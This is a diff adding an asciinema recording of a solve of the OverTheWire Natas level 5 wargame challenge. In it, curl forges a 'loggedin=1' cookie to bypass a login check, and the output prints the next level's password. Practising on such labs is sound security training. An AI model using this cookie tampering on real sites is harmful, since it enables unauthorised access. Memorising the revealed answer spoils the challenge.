@@ -1,0 +1,6 @@
+{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793469345,"idle_time_limit":2.0,"command":"python3 -I /home/claude/tools/ptyrun_sh.py /home/claude/solves/natas/L5.sh","title":"Natas L5 solve","env":{"SHELL":"/bin/bash"}}
+[0.012, "o", "$ curl -sI -u natas5:<pw> http://natas5.natas.labs.overthewire.org/ | grep -i set-cookie\r\r\n"]
+[1.206, "o", "Set-Cookie: loggedin=0\r\r\r\n"]
+[0.001, "o", "$ curl -s -u natas5:<pw> -b \"loggedin=1\" http://natas5.natas.labs.overthewire.org/\r\r\n"]
+[0.887, "o", "Access granted. The password for natas6 is 7mhjtShJAcld2NYbKHEadnhEwRn2P8VT</div>\r\r\n"]
+[0.003, "x", "0"]
